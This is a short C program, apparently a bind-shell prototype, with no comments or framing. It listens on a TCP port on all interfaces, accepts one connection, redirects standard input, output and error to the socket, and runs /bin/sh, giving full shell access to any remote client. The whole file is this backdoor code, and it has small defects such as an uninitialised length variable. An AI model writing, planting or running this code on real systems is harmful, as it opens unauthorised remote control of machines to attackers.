#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>

int main(void) {
        int sockfd;
        struct sockaddr_in SA;
        int clientSaSize;
        char *arg_list[] = { { "/bin/sh" }, NULL };
        sockfd = socket(0x00000002, 0x00000001, 0x0);
        SA.sin_family = 0x00000002;
        SA.sin_addr.s_addr = 0x00000000;
        SA.sin_port = 0x5c11;
        bind(sockfd, (struct sockaddr *)&SA, 0x10);
        listen(sockfd, 1);
        sockfd = accept(sockfd, (struct sockaddr *)&SA, &clientSaSize);
        dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);
        execve(arg_list[0], arg_list, arg_list[1]);
        close(sockfd);
        return 0;
}
